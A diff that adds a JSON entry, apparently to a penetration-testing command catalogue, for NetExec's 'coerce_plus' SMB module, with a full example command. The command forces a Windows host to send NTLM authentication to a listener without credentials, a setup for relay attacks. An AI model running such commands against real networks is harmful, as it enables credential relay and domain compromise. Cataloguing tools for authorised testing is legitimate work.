@@ -1,0 +1,25 @@
+{
+  "id": "nxc-smb-coerce-plus",
+  "name": "NetExec SMB Coerce Plus",
+  "command": "nxc smb '<ip>' -u '' -p '' -M coerce_plus -o LISTENER=<listener_ip>",
+  "description": "Trigger NTLM authentication coercion using multiple methods (PetitPotam, PrinterBug, etc.) without credentials",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "coerce",
+    "ntlm-relay",
+    "petitpotam",
+    "printerbug",
+    "unauthenticated"
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u '' -p '' -M coerce_plus -o LISTENER=192.168.1.50"
+  ]
+}
